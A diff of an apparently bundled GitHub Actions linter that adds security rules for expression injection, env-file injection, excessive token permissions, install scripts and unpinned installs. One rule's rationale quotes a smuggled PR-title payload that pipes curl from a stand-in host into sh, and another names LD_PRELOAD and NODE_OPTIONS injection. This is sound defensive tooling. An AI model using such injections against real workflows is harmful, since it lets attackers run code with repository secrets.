+    references: ["https://github.com/actions/setup-node/blob/main/docs/advanced-usage.md#node-version-file"],
+    impact: "medium",
+    example: {
+      bad: "# ci.yml\n- uses: actions/setup-node@v4\n  with:\n    node-version: 20\n# release.yml\n- uses: actions/setup-node@v4\n  with:\n    node-version: 22",
+      good: "# ci.yml and release.yml\n- uses: actions/setup-node@v4\n  with:\n    node-version-file: .nvmrc"
+    }
+  },
+  check({ project, report }) {
+    const byInput = /* @__PURE__ */ new Map();
+    for (const workflow of [...project.workflows, ...project.actions]) {
+      const file = project.files.get(workflow.path);
+      if (!file) continue;
+      for (const job of workflow.jobs) {
+        if (job.uses || job.matrix !== void 0) continue;
+        for (const step of job.steps) {
+          const action = setupActionOf(step);
+          const setup = action ? SETUP_ACTIONS[action] : void 0;
+          if (!action || !setup?.version) continue;
+          if (setup.versionFiles?.some((input2) => step.with.has(input2))) continue;
+          const entry2 = step.with.get(setup.version);
+          if (!entry2 || entry2.kind !== "literal" || entry2.origin !== "direct") continue;
+          const pair = nestedPair(stepNode(workflow, step), "with", setup.version);
+          const raw = pair ? rawScalar(file.content, pair.pair.value) : void 0;
+          const version = raw === void 0 ? void 0 : normalize3(raw);
+          if (version === void 0) continue;
+          const key2 = `${action}\0${setup.version}`;
+          const files = byInput.get(key2) ?? /* @__PURE__ */ new Map();
+          const uses = files.get(workflow.path) ?? [];
+          uses.push({ path: workflow.path, line: entry2.line, version });
+          files.set(workflow.path, uses);
+          byInput.set(key2, files);
+        }
+      }
+    }
+    for (const [key2, files] of byInput) {
+      const [action = "", input2 = ""] = key2.split("\0");
+      const uses = [...files.values()].filter((entries2) => !conflicting(entries2.map((use) => use.version))).flat();
+      const versions = [...new Set(uses.map((use) => use.version))];
+      if (new Set(uses.map((use) => use.path)).size < 2 || !conflicting(versions)) continue;
+      const [first, ...others] = uses;
+      if (!first) continue;
+      const hint = VERSION_FILES[action] ?? "a shared version file";
+      report({
+        path: first.path,
+        line: first.line,
+        key: `${action}.${input2}`,
+        message: `${action} \`${input2}\` differs across workflows: ${versions.join(", ")}.`,
+        suggestion: `Pick one version and read it from ${hint} in every workflow.`,
+        confidence: "medium",
+        related: others.map((use) => ({ path: use.path, line: use.line }))
+      });
+    }
+  }
+});
+
+// src/lint/rules/redundancy/index.ts
+var rules7 = [
+  duplicate_setup_step_default,
+  repeated_job_setup_default,
+  rebuild_per_job_default,
+  duplicate_command_default,
+  shadowed_env_default,
+  toolchain_version_drift_default
+];
 
 // src/lint/rules/registries/ghcr.ts
 var GHCR = "ghcr.io";
@@ -17715,8 +18303,8 @@ var ghcr_default = defineRule({
         const destinations = [];
         const logins = [];
         let unknownPushes = 0;
-        for (const entry of entries2) {
-          const { step, path } = entry;
+        for (const entry2 of entries2) {
+          const { step, path } = entry2;
           const file = project.files.get(path);
           if (usesAction2(step, "docker/build-push-action")) {
             const push = step.with.get("push");
@@ -17762,13 +18350,13 @@ var ghcr_default = defineRule({
             const registry = step.with.get("registry");
             if (registry && registry.kind !== "literal") continue;
             const host = registry ? loginHost(String(registry.value)) : "docker.io";
-            logins.push({ host, entry, line: registry?.line ?? step.uses?.line ?? step.line, key: `${step.key}:login` });
+            logins.push({ host, entry: entry2, line: registry?.line ?? step.uses?.line ?? step.line, key: `${step.key}:login` });
             continue;
           }
           for (const { command, line } of commandsOf(step)) {
             const login = commandLogin(command);
             if (login !== void 0) {
-              if (!login.includes("$")) logins.push({ host: loginHost(login), entry, line, key: `${step.key}:login:${loginHost(login)}` });
+              if (!login.includes("$")) logins.push({ host: loginHost(login), entry: entry2, line, key: `${step.key}:login:${loginHost(login)}` });
               continue;
             }
             const pushed = commandPushes(command);
@@ -17941,16 +18529,16 @@ var github_npm_default = defineRule({
       for (const model of [...project.workflows, ...project.actions]) {
         for (const job of model.jobs) {
           const entries2 = expandedJobSteps(project, model, job);
-          entries2.forEach((entry, position) => {
-            for (const { command, line } of commandsOf(entry.step)) {
+          entries2.forEach((entry2, position) => {
+            for (const { command, line } of commandsOf(entry2.step)) {
               const registry = publishRegistry(command);
               if (registry === void 0) continue;
               if (registry) {
                 if (registry.includes("$") || isGithubRegistry(registry)) continue;
                 report({
-                  path: entry.path,
+                  path: entry2.path,
                   line,
-                  key: `${entry.step.key}:publish-registry:${registry}`,
+                  key: `${entry2.step.key}:publish-registry:${registry}`,
                   message: `This step publishes to \`${registry}\` instead of the GitHub npm registry.`,
                   suggestion: PUBLISH_SETUP(primaryScope)
                 });
@@ -17960,7 +18548,7 @@ var github_npm_default = defineRule({
               const setup = entries2.slice(0, position).reverse().find((candidate) => setupNode(candidate.step) && candidate.step.with.has("registry-url"));
               const url = setup?.step.with.get("registry-url");
               if (!setup || !url || url.kind !== "literal" || isGithubRegistry(String(url.value))) continue;
-              const related = [{ path: entry.path, line }];
+              const related = [{ path: entry2.path, line }];
               report({
                 path: setup.path,
                 line: url.line,
@@ -18003,12 +18591,2048 @@ var github_npm_default = defineRule({
 });
 
 // src/lint/rules/registries/index.ts
-var rules7 = [ghcr_default, github_npm_default];
+var rules8 = [ghcr_default, github_npm_default];
+
+// src/lint/rules/security/shared.ts
+var import_yaml12 = __toESM(require_dist(), 1);
+var PRIVILEGED_TRIGGERS = ["pull_request_target", "workflow_run", "issue_comment"];
+function isPrivileged(workflow) {
+  return workflow.kind === "workflow" && hasTrigger(workflow, ...PRIVILEGED_TRIGGERS);
+}
+function privilegedTriggers(workflow) {
+  return workflow.triggers.map((trigger2) => trigger2.event).filter((event) => PRIVILEGED_TRIGGERS.includes(event));
+}
+var INDEX = String.raw`(?:\.\*|\.\d+|\[[^\]]*\])`;
+var AUTHOR = String.raw`(?:message|author\.(?:email|name)|committer\.(?:email|name))`;
+var UNTRUSTED_CONTEXT = new RegExp(
+  [
+    String.raw`github\.head_ref\b`,
+    String.raw`github\.event\.issue\.(?:title|body)\b`,
+    String.raw`github\.event\.pull_request\.(?:title|body|head\.(?:ref|label|repo\.default_branch))\b`,
+    String.raw`github\.event\.(?:comment|review|review_comment)\.body\b`,
+    String.raw`github\.event\.discussion\.(?:title|body)\b`,
+    String.raw`github\.event\.pages${INDEX}\.page_name\b`,
+    String.raw`github\.event\.commits${INDEX}\.${AUTHOR}\b`,
+    String.raw`github\.event\.head_commit\.${AUTHOR}\b`,
+    String.raw`github\.event\.workflow_run\.(?:head_branch|display_title|head_commit\.${AUTHOR}|pull_requests${INDEX}\.head\.ref)\b`
+  ].join("|"),
+  "i"
+);
+function normalizeAccess(text4) {
+  return text4.replace(/\s*\[\s*(['"])([A-Za-z_][A-Za-z0-9_-]*)\1\s*\]/g, ".$2");
+}
+function untrustedExpressions(text4) {
+  const result = [];
+  for (const match2 of text4.matchAll(/\$\{\{([\s\S]*?)\}\}/g)) {
+    const context3 = UNTRUSTED_CONTEXT.exec(normalizeAccess(match2[1] ?? ""))?.[0];
+    if (context3 !== void 0) result.push({ text: match2[0], context: context3, offset: match2.index });
+  }
+  return result;
+}
+function scriptLines(step) {
+  const script = step.run?.value;
+  if (script === void 0) return [];
+  const result = [];
+  let offset = 0;
+  for (const raw of script.split("\n")) {
+    result.push({ text: raw.replace(/\r$/, ""), offset, line: runLine(step, offset) });
+    offset += raw.length + 1;
+  }
+  return result;
+}
+var ENV_FILE_WRITE = /(?:>>?|\btee\b(?:\s+-a|\s+--append)?)\s*["']?\$\{?(GITHUB_ENV|GITHUB_PATH|GITHUB_OUTPUT)\b/;
+function rootNode(workflow) {
+  return workflow.source.doc.contents;
+}
+function jobNode2(workflow, job) {
+  const jobs = field(workflow.source, rootNode(workflow), "jobs");
+  return field(workflow.source, jobs?.value, job.id)?.value;
+}
+function permissionsAt(workflow, node) {
+  const entry2 = field(workflow.source, node, "permissions");
+  if (!entry2) return void 0;
+  return { value: toJS(workflow.source, entry2.value), line: entry2.line };
+}
+function workflowPermissions(workflow) {
+  return permissionsAt(workflow, rootNode(workflow));
+}
+function jobPermissions(workflow, job) {
+  return permissionsAt(workflow, jobNode2(workflow, job));
+}
+function effectivePermissions(workflow, job) {
+  return jobPermissions(workflow, job) ?? workflowPermissions(workflow);
+}
+function writeScopes(permissions) {
+  const value2 = permissions?.value;
+  if (typeof value2 === "string") return value2.trim() === "write-all" ? ["*"] : [];
+  if (!value2 || typeof value2 !== "object" || Array.isArray(value2)) return [];
+  return Object.entries(value2).filter(([, level]) => typeof level === "string" && level.trim() === "write").map(([scope2]) => scope2);
+}
+var SECRET_REFERENCE = /\$\{\{[^}]*\bsecrets\.(?!GITHUB_TOKEN\b)[A-Za-z_]/i;
+function stepHasSecretEnv(workflow, job, step) {
+  return [workflow.env, job.env, step.env].some(
+    (env) => Object.values(env).some((value2) => typeof value2 === "string" && SECRET_REFERENCE.test(normalizeAccess(value2)))
+  );
+}
+function untrustedEnvNames(workflow, job, step, include = () => true) {
+  const names = /* @__PURE__ */ new Set();
+  for (const env of [workflow.env, job.env, step.env]) {
+    for (const [name, value2] of Object.entries(env)) {
+      if (typeof value2 === "string" && untrustedExpressions(value2).some(include)) names.add(name);
+    }
+  }
+  return [...names];
+}
+function isRefName(expression) {
+  return /head_ref|head\.ref|head_branch|head\.label/i.test(expression.context);
+}
+var UNTRUSTED_REF = /\$\{\{[^}]*(?:github\.event\.pull_request\.head\.(?:sha|ref)|github\.head_ref|github\.event\.workflow_run\.(?:head_sha|head_branch)|github\.event\.workflow_run\.pull_requests[^}]*\.head\.(?:sha|ref))[^}]*\}\}|refs\/pull\//i;
+var UNTRUSTED_REPOSITORY = /\$\{\{[^}]*(?:github\.event\.pull_request\.head\.repo\.full_name|github\.event\.workflow_run\.head_repository\.full_name)[^}]*\}\}/i;
+function untrustedCheckoutTarget(step) {
+  const ref = step.with.get("ref")?.value;
+  if (typeof ref === "string" && UNTRUSTED_REF.test(normalizeAccess(ref))) return `ref: ${ref.trim()}`;
+  const repository = step.with.get("repository")?.value;
+  if (typeof repository === "string" && UNTRUSTED_REPOSITORY.test(normalizeAccess(repository))) return `repository: ${repository.trim()}`;
+  return void 0;
+}
+function withString2(step, key2) {
+  const value2 = step.with.get(key2)?.value;
+  return typeof value2 === "string" ? value2.trim() : typeof value2 === "boolean" ? String(value2) : void 0;
+}
+var LOCAL_CONTEXT = (value2) => value2 !== void 0 && !/^(?:https?:|git[@:]|\$\{\{)/i.test(value2);
+function jobHandlesUntrusted(workflow, job) {
+  return job.steps.some(
+    (step) => step.uses?.action.name === "actions/checkout" && untrustedCheckoutTarget(step) !== void 0 || scriptLines(step).some((line) => /\bgh\s+pr\s+checkout\b/.test(line.text) || untrustedExpressions(line.text).length > 0) || step.run !== void 0 && untrustedEnvNames(workflow, job, step).length > 0
+  );
+}
+function executesWorkspace(step) {
+  const action = step.uses?.action;
+  if (action?.kind !== "remote" || action.name === void 0) return void 0;
+  const name = action.name.toLowerCase();
+  const what = `the action \`${step.uses?.value ?? name}\``;
+  switch (name) {
+    case "github/codeql-action/autobuild":
+    case "pre-commit/action":
+    case "bahmutov/npm-install":
+    case "cypress-io/github-action":
+      return what;
+    case "docker/build-push-action":
+      return LOCAL_CONTEXT(withString2(step, "context")) ? what : void 0;
+    case "docker/bake-action":
+      return LOCAL_CONTEXT(withString2(step, "source")) ? what : void 0;
+    case "gradle/gradle-build-action":
+      return withString2(step, "arguments") ? what : void 0;
+    case "ruby/setup-ruby":
+      return withString2(step, "bundler-cache") === "true" ? what : void 0;
+    case "pnpm/action-setup": {
+      const install = withString2(step, "run_install");
+      return install !== void 0 && install !== "false" ? what : void 0;
+    }
+    default:
+      return void 0;
+  }
+}
+function directChild3(node, key2) {
+  if (!(0, import_yaml12.isMap)(node)) return void 0;
+  const pair = node.items.find((item) => (0, import_yaml12.isPair)(item) && (0, import_yaml12.isScalar)(item.key) && String(item.key.value) === key2);
+  return pair && !(0, import_yaml12.isAlias)(pair.value) ? pair.value : void 0;
+}
+function directStep(workflow, step) {
+  const match2 = /^(?:jobs\.([^.]+)\.steps|runs\.steps)\[(\d+)\]$/.exec(step.key);
+  if (!match2) return void 0;
+  const root = rootNode(workflow);
+  const parent = match2[1] !== void 0 ? directChild3(directChild3(root, "jobs"), match2[1]) : directChild3(root, "runs");
+  const stepsNode = directChild3(parent, "steps");
+  if (!(0, import_yaml12.isSeq)(stepsNode)) return void 0;
+  const node = stepsNode.items[Number(match2[2])];
+  if (!(0, import_yaml12.isMap)(node) || node.flow || lineOfNode(workflow.source, node) !== step.line) return void 0;
+  if (node.items.some((pair) => !(0, import_yaml12.isScalar)(pair.key) || pair.key.value === "<<")) return void 0;
+  return node;
+}
+
+// src/lint/rules/security/env-file-injection.ts
+var env_file_injection_default = defineRule({
+  meta: {
+    id: "security/env-file-injection",
+    ruleset: "security",
+    description: "Attacker-controlled values must not be written to `$GITHUB_ENV`, `$GITHUB_PATH`, or `$GITHUB_OUTPUT`.",
+    rationale: "Lines written to `$GITHUB_ENV` become environment variables for every later step, and `$GITHUB_PATH` entries change which binaries run. A branch name or issue title containing a newline can append its own `NODE_OPTIONS=--require=...`, `LD_PRELOAD`, or `PATH` entry and take over subsequent steps, including ones holding secrets. Interpolated values written to `$GITHUB_OUTPUT` can likewise forge outputs consumed by later jobs.",
+    kind: "practice",
+    defaultSeverity: "error",
+    presets: ["recommended", "agentic", "strict"],
+    requires: [],
+    defaultOptions: {},
+    references: [
+      "https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks",
+      "https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands#setting-an-environment-variable"
+    ],
+    impact: "high",
+    example: {
+      bad: '- run: echo "BRANCH=${{ github.head_ref }}" >> "$GITHUB_ENV"',
+      good: '- env:\n    HEAD_REF: ${{ github.head_ref }}\n  run: |\n    if [[ "$HEAD_REF" =~ ^[A-Za-z0-9._/-]+$ ]]; then echo "BRANCH=$HEAD_REF" >> "$GITHUB_OUTPUT"; fi'
+    }
+  },
+  check({ project, report }) {
+    for (const { workflow, job, step } of steps([...project.workflows, ...project.actions])) {
+      if (!step.run) continue;
+      const tainted = untrustedEnvNames(workflow, job, step, (expression) => !isRefName(expression));
+      for (const line of scriptLines(step)) {
+        const target = ENV_FILE_WRITE.exec(line.text)?.[1];
+        if (target === void 0) continue;
+        const expression = untrustedExpressions(line.text)[0];
+        if (expression) {
+          report({
+            path: workflow.path,
+            line: line.line,
+            key: `${step.key}.run`,
+            message: `\`${expression.context}\` is interpolated into a write to $${target}; a crafted value can inject extra variables, paths, or outputs.`,
+            suggestion: "Pass the value through `env:`, validate it against a strict pattern, and use a heredoc delimiter for multi-line values before writing it."
+          });
+          continue;
+        }
+        const variable = tainted.find(
+          (name) => /^[A-Za-z_][A-Za-z0-9_]*$/.test(name) && new RegExp(String.raw`\$(?:\{${name}\}|${name}\b)`).test(line.text)
+        );
+        if (variable === void 0) continue;
+        report({
+          path: workflow.path,
+          line: line.line,
+          key: `${step.key}.run`,
+          message: `\`$${variable}\` holds an attacker-controlled value and is written to $${target}, where a newline can inject extra entries.`,
+          suggestion: "Validate the value against a strict pattern (no newlines) before writing it, or use a random heredoc delimiter (`name<<EOF_$RANDOM`) so a newline cannot start a new entry."
+        });
+      }
+    }
+  }
+});
+
+// src/lint/rules/security/excessive-permissions.ts
+var ALWAYS_SENSITIVE = ["contents"];
+var SENSITIVE_WITH_UNTRUSTED = ["pull-requests", "issues"];
+var excessive_permissions_default = defineRule({
+  meta: {
+    id: "security/excessive-permissions",
+    ruleset: "security",
+    description: "Workflows should declare least-privilege `permissions:` for the `GITHUB_TOKEN`, and never grant `write-all` or write access to code and pull requests on untrusted triggers.",
+    rationale: "Without a `permissions:` block the token gets the repository or organization default, which on older repositories is read/write to almost every scope. Any compromised dependency, action, or injected script inherits that access. Declaring the scopes each job needs limits the blast radius; on `pull_request_target`, `issue_comment`, and `workflow_run`, where outside contributors influence what runs, write access to contents lets an attacker push code, and write access to pull requests or issues in a job that also runs untrusted code or input lets them approve changes or spam the tracker.",
+    kind: "practice",
+    defaultSeverity: "warn",
+    presets: ["recommended", "agentic", "strict"],
+    requires: [],
+    defaultOptions: {},
+    references: [
+      "https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#permissions",
+      "https://docs.github.com/en/actions/concepts/security/github_token",
+      "https://docs.github.com/en/actions/reference/security/secure-use"
+    ],
+    impact: "high",
+    example: {
+      bad: "on: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: make test",
+      good: "on: push\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: make test"
+    }
+  },
+  check({ project, report }) {
+    for (const workflow of project.workflows) {
+      if (workflow.kind !== "workflow" || workflow.triggers.length === 0) continue;
+      if (workflow.triggers.every((trigger2) => trigger2.event === "workflow_call")) continue;
+      const privileged = isPrivileged(workflow);
+      const triggers = privilegedTriggers(workflow).join(", ");
+      const top = workflowPermissions(workflow);
+      const checkGrant = (permissions, key2, untrusted) => {
+        const scopes2 = writeScopes(permissions);
+        const all = scopes2.includes("*");
+        const sensitive = all ? ["write-all"] : scopes2.filter((scope2) => ALWAYS_SENSITIVE.includes(scope2) || untrusted && SENSITIVE_WITH_UNTRUSTED.includes(scope2));
+        if (privileged && sensitive.length > 0) {
+          report({
+            path: workflow.path,
+            line: permissions.line,
+            key: key2,
+            impact: "high",
+            message: `${sensitive.map((scope2) => scope2 === "write-all" ? "`write-all`" : `\`${scope2}: write\``).join(" and ")} granted in a workflow triggered by ${triggers}, where untrusted input can drive what the token does.`,
+            suggestion: "Grant only read access here and move any write operation to a separate job or workflow that does not process untrusted input."
+          });
+        } else if (all) {
+          report({
+            path: workflow.path,
+            line: permissions.line,
+            key: key2,
+            impact: "medium",
+            message: "`permissions: write-all` grants the token write access to every scope.",
+            suggestion: "List only the scopes this workflow needs, e.g. `permissions: { contents: read }`."
+          });
+        }
+      };
+      if (top) checkGrant(top, "permissions", privileged && workflow.jobs.some((job) => !jobPermissions(workflow, job) && jobHandlesUntrusted(workflow, job)));
+      for (const job of workflow.jobs) {
+        const own3 = jobPermissions(workflow, job);
+        if (own3) {
+          checkGrant(own3, `${job.key}.permissions`, privileged && jobHandlesUntrusted(workflow, job));
+        } else if (!top) {
+          report({
+            path: workflow.path,
+            line: job.line,
+            key: `${job.key}.permissions`,
+            impact: "medium",
+            message: `Job \`${job.id}\` has no \`permissions:\` and the workflow sets none, so the token gets the repository default permissions.`,
+            suggestion: "Add a top-level `permissions: { contents: read }` (or `{}`) and grant extra scopes only on the jobs that need them."
+          });
+        }
+      }
+    }
+  }
+});
+
+// src/lint/rules/security/expression-injection.ts
+var expression_injection_default = defineRule({
+  meta: {
+    id: "security/expression-injection",
+    ruleset: "security",
+    description: "Attacker-controlled `${{ }}` values (titles, bodies, branch names, commit messages) must not be interpolated directly into `run:` scripts or `github-script` code.",
+    rationale: 'Expressions are substituted into the script text before the shell or JavaScript runtime parses it, so a pull request title like `a"; curl evil.sh | sh; #` becomes code. The job then runs that code with its token and secrets. Passing the value through an environment variable makes it plain data that the script reads at run time.',
+    kind: "practice",
+    defaultSeverity: "error",
+    presets: ["recommended", "agentic", "strict"],
+    requires: [],
+    defaultOptions: {},
+    references: [
+      "https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks",
+      "https://securitylab.github.com/resources/github-actions-untrusted-input/"
+    ],
+    impact: "high",
+    example: {
+      bad: '- run: echo "Title: ${{ github.event.pull_request.title }}"',
+      good: '- env:\n    PR_TITLE: ${{ github.event.pull_request.title }}\n  run: echo "Title: $PR_TITLE"'
+    }
+  },
+  check({ project, report }) {
+    for (const { workflow, step } of steps([...project.workflows, ...project.actions])) {
+      if (step.run) {
+        for (const line of scriptLines(step)) {
+          if (ENV_FILE_WRITE.test(line.text)) continue;
+          for (const expression of untrustedExpressions(line.text)) {
+            report({
+              path: workflow.path,
+              line: line.line,
+              key: `${step.key}.run`,
+              message: `\`${expression.context}\` is interpolated into a shell script, where a crafted value becomes code.`,
+              suggestion: `Map it to an environment variable on the step (e.g. \`env: { VALUE: ${expression.text} }\`) and reference \`"$VALUE"\` in the script.`
+            });
+          }
+        }
+      }
+      if (usesAction(step, "actions/github-script")) {
+        const script = step.with.get("script");
+        if (typeof script?.value !== "string") continue;
+        const seen = /* @__PURE__ */ new Set();
+        for (const expression of untrustedExpressions(script.value)) {
+          if (seen.has(expression.context)) continue;
+          seen.add(expression.context);
+          report({
+            path: workflow.path,
+            line: script.line,
+            key: `${step.key}.with.script`,
+            message: `\`${expression.context}\` is interpolated into github-script code, where a crafted value becomes JavaScript.`,
+            suggestion: "Read the value from the `context` object (e.g. `context.payload.pull_request.title`) or pass it through `env:` and `process.env`."
+          });
+        }
+      }
+    }
+  }
+});
+
+// src/lint/rules/security/install-scripts-privileged.ts
+var NPMRC_IGNORE = /^\s*ignore-scripts\s*=\s*true\s*$/m;
+function installCommand(command) {
+  const words2 = commandWords(command);
+  const [tool2, sub] = words2;
+  if (words2.includes("--ignore-scripts") || words2.some((word) => word.startsWith("--ignore-scripts="))) return void 0;
+  if (tool2 === "npm" && (sub === "install" || sub === "i" || sub === "ci")) return `npm ${sub}`;
+  if (tool2 === "pnpm" && (sub === "install" || sub === "i")) return `pnpm ${sub}`;
+  if (tool2 === "yarn" && (sub === void 0 || sub === "install" || sub.startsWith("--"))) return "yarn install";
+  return void 0;
+}
+function envDisablesScripts(env) {
+  return Object.entries(env).some(
+    ([name, value2]) => name.toLowerCase() === "npm_config_ignore_scripts" && String(value2).trim().toLowerCase() === "true"
+  );
+}
+var install_scripts_privileged_default = defineRule({
+  meta: {
+    id: "security/install-scripts-privileged",
+    ruleset: "security",
+    description: "Package installs in privileged workflows that hold secrets or a write token should pass `--ignore-scripts`.",
+    rationale: "npm, yarn, and pnpm run `preinstall`/`install`/`postinstall` scripts from every dependency by default. In a job that triggers on `pull_request_target`, `workflow_run`, or `issue_comment` and also holds secrets or a writable token, a single compromised or attacker-controlled package can read those credentials during the install. Disabling lifecycle scripts, and running only the specific builds you need afterwards, keeps install-time code away from the credentials.",
+    kind: "practice",
+    defaultSeverity: "warn",
+    presets: ["strict"],
+    requires: [],
+    defaultOptions: {},
+    references: [
+      "https://docs.npmjs.com/cli/commands/npm-install#ignore-scripts",
+      "https://docs.github.com/en/actions/reference/security/secure-use",
+      "https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/"
+    ],
+    impact: "medium",
+    example: {
+      bad: "on: pull_request_target\npermissions:\n  pull-requests: write\njobs:\n  label:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm ci",
+      good: "on: pull_request_target\npermissions:\n  pull-requests: write\njobs:\n  label:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm ci --ignore-scripts"
+    }
+  },
+  check({ project, report }) {
+    const npmrc = project.files.get(".npmrc")?.content;
+    if (npmrc !== void 0 && NPMRC_IGNORE.test(npmrc)) return;
+    for (const workflow of project.workflows) {
+      if (workflow.kind !== "workflow" || !isPrivileged(workflow)) continue;
+      const triggers = privilegedTriggers(workflow).join(", ");
+      for (const job of workflow.jobs) {
+        const writes = writeScopes(effectivePermissions(workflow, job));
+        for (const step of job.steps) {
+          if (!step.run) continue;
+          if (envDisablesScripts(workflow.env) || envDisablesScripts(job.env) || envDisablesScripts(step.env)) continue;
+          const secrets = stepHasSecretEnv(workflow, job, step);
+          if (writes.length === 0 && !secrets) continue;
+          const holds = [
+            ...writes.length > 0 ? [writes.includes("*") ? "a `write-all` token" : `write access to ${writes.join(", ")}`] : [],
+            ...secrets ? ["secrets in its environment"] : []
+          ].join(" and ");
+          for (const { command, line } of commandsOf(step)) {
+            const install = installCommand(command);
+            if (!install) continue;
+            report({
+              path: workflow.path,
+              line,
+              key: `${step.key}.run`,
+              message: `\`${install}\` runs dependency lifecycle scripts in a ${triggers} job that holds ${holds}.`,
+              suggestion: "Add `--ignore-scripts` (or set `ignore-scripts=true` in `.npmrc`), then run any required build steps explicitly."
+            });
+          }
+        }
+      }
+    }
+  }
+});
+
+// src/lint/rules/security/mutable-remote-ref.ts
+var SHA = /^[0-9a-f]{40}$/i;
+var VERSION_TAG = /^v?\d+(?:\.\d+){1,2}(?:[-+][\w.-]+)?$/;
+var MUTABLE_GO = /* @__PURE__ */ new Set(["latest", "master", "main", "HEAD", "head", "upgrade", "patch"]);
+function isImmutableRef(ref) {
+  return ref !== void 0 && (SHA.test(ref) || VERSION_TAG.test(ref));
+}
+function stripQuotes(word) {
+  return word.replace(/^["']|["']$/g, "");
+}
+function pipIssue(words2) {
+  const installAt = words2.findIndex((word) => word === "install");
+  const tool2 = words2[0] ?? "";
+  const isPip = /^pip3?$/.test(tool2) || /^python3?$/.test(tool2) && words2[1] === "-m" && /^pip3?$/.test(words2[2] ?? "");
+  const isUv = tool2 === "uv" && words2[1] === "pip";
+  if (!(isPip || isUv) || installAt < 0) return void 0;
+  for (const raw of words2.slice(installAt + 1)) {
+    const word = stripQuotes(raw);
+    const spec2 = /(?:^|@\s*)git\+[a-z]+:\/\/(\S+)$/i.exec(word)?.[1] ?? /^git\+(\S+)$/i.exec(word)?.[1];
+    if (spec2 === void 0) continue;
+    const path = spec2.split("#")[0] ?? "";
+    const ref = /@([^@/]+)$/.exec(path.replace(/^[^/]*@/, ""))?.[1];
+    if (!isImmutableRef(ref)) return `\`${word}\` installs ${ref === void 0 ? "the default branch" : `\`${ref}\``} of a git repository`;
+  }
+  return void 0;
+}
+function nodeIssue(words2) {
+  const [tool2, sub] = words2;
+  if (!tool2 || !["npm", "yarn", "pnpm"].includes(tool2)) return void 0;
+  if (!sub || !["install", "i", "add"].includes(sub)) return void 0;
+  for (const raw of words2.slice(2)) {
+    const word = stripQuotes(raw);
+    if (!/^(?:github:|git\+|git:\/\/)/i.test(word)) continue;
+    const ref = word.includes("#") ? word.slice(word.indexOf("#") + 1) : void 0;
+    if (ref !== void 0 && (ref.startsWith("semver:") || isImmutableRef(ref))) continue;
+    return `\`${word}\` installs ${ref === void 0 ? "the default branch" : `\`${ref}\``} of a git repository`;
+  }
+  return void 0;
+}
+function goIssue(words2) {
+  if (words2[0] !== "go" || words2[1] !== "install") return void 0;
+  for (const raw of words2.slice(2)) {
+    const word = stripQuotes(raw);
+    const ref = /@([^@]+)$/.exec(word)?.[1];
+    if (ref !== void 0 && MUTABLE_GO.has(ref)) return `\`${word}\` resolves a moving version`;
+  }
+  return void 0;
+}
+function cargoIssue(words2) {
+  if (words2[0] !== "cargo" || words2[1] !== "install") return void 0;
+  const git2 = words2.findIndex((word) => word === "--git" || word.startsWith("--git="));
+  if (git2 < 0) return void 0;
+  const pinned = words2.some((word) => /^--(?:rev|tag)(?:=|$)/.test(word));
+  if (pinned) return void 0;
+  const url = words2[git2]?.startsWith("--git=") ? words2[git2]?.slice(6) : words2[git2 + 1];
+  return `\`cargo install --git ${url ?? ""}\` builds whatever the branch points at`;
+}
+var mutable_remote_ref_default = defineRule({
+  meta: {
+    id: "security/mutable-remote-ref",
+    ruleset: "security",
+    description: "Tools installed straight from a git repository or `@latest` should be pinned to a commit SHA or release version.",
+    rationale: "Installing from a branch (or a repository's default branch) runs whatever code that branch holds at the moment the job starts. A force-push, a compromised maintainer account, or a hijacked repository silently changes what CI executes, and the run cannot be reproduced later. Pinning to a full commit SHA or a released version makes the dependency immutable and reviewable.",
+    kind: "practice",
+    defaultSeverity: "warn",
+    presets: ["recommended", "agentic", "strict"],
+    requires: [],
+    defaultOptions: {},
+    references: [
+      "https://docs.github.com/en/actions/reference/security/secure-use#using-third-party-actions",
+      "https://pip.pypa.io/en/stable/topics/vcs-support/",
+      "https://docs.npmjs.com/cli/configuring-npm/package-json#git-urls-as-dependencies",
+      "https://go.dev/ref/mod#go-install",
+      "https://doc.rust-lang.org/cargo/commands/cargo-install.html"
+    ],
+    impact: "medium",
+    example: {
+      bad: "- run: pip install git+https://github.com/example/tool.git@main",
+      good: "- run: pip install git+https://github.com/example/tool.git@3f1c2b9e8d7a6f5e4d3c2b1a09f8e7d6c5b4a392"
+    }
+  },
+  check({ project, report }) {
+    for (const { workflow, step } of steps(project.workflows)) {
+      for (const { command, line } of commandsOf(step)) {
+        const words2 = commandWords(command);
+        const issue = pipIssue(words2) ?? nodeIssue(words2) ?? goIssue(words2) ?? cargoIssue(words2);
+        if (!issue) continue;
+        report({
+          path: workflow.path,
+          line,
+          key: `${step.key}.run`,
+          message: `${issue}, so the code CI runs can change without any change to this repository.`,
+          suggestion: "Pin the install to a full commit SHA (or a released version) instead of a branch or `latest`."
+        });
+      }
+    }
+  }
+});
+
+// src/lint/rules/security/persisted-credentials.ts
+var import_yaml14 = __toESM(require_dist(), 1);
+var UPLOAD_ACTIONS = ["actions/upload-artifact", "actions/upload-artifact/merge"];
+var SINGLE_LINE = /* @__PURE__ */ new Set([import_yaml14.Scalar.PLAIN, import_yaml14.Scalar.QUOTE_DOUBLE, import_yaml14.Scalar.QUOTE_SINGLE]);
+var WORKSPACE_ROOT = /^(?:\.\/?|\$\{\{\s*github\.workspace\s*\}\}\/?)$/;
+function uploadsGitDirectory(step, file) {
+  if (!usesAction(step, ...UPLOAD_ACTIONS)) return false;
+  if (isTrue(step.with.get("include-hidden-files")?.value)) return true;
+  const path = step.with.get("path")?.value;
+  if (typeof path !== "string" || !listOf(path).some((entry2) => WORKSPACE_ROOT.test(entry2))) return false;
+  const version = actionVersion(step, file);
+  if (!version) return false;
+  return version.major < 4 || version.major === 4 && version.minor !== void 0 && version.minor < 4;
+}
+function exposure(workflow, job, file) {
+  const upload = job.steps.find((step) => uploadsGitDirectory(step, file));
+  if (upload) return `the job uploads an artifact that can include \`.git/config\` (line ${stepLine(upload)})`;
+  if (!hasTrigger(workflow, "pull_request_target", "workflow_run")) return void 0;
